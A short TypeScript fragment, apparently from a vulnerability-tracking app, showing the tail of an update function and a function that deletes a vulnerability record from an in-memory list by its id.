    vulnerabilities[index] = vulnerability;
  }
};

export const deleteVulnerability = (vulnerabilityId: string) => {
  vulnerabilities = vulnerabilities.filter(v => v.id !== vulnerabilityId);
};
